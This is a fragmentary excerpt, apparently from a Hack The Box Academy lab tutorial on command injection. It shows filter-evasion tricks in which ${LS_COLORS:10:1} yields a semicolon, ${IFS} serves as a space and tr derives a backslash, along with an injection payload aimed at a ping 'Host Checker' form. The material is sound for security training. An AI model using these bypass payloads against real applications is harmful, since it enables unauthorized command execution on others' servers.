...
```shell-session
xF1NN@htb[/htb]$ echo ${LS_COLORS:10:1}
...
So, let's try to use environment variables to add a semi-colon and a space to our payload (`127.0.0.1${LS_COLORS:10:1}${IFS}`) as our payload, and see if we can bypass the filter: ![Screenshot of a web application interface showing a POST request to 127.0.0.1 with headers and a payload containing a potential command injection. The response section displays HTML code for a 'Host Checker' form, allowing IP input and showing ping results for 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_5.jpg)
...
```shell-session
xF1NN@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
xF1NN@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
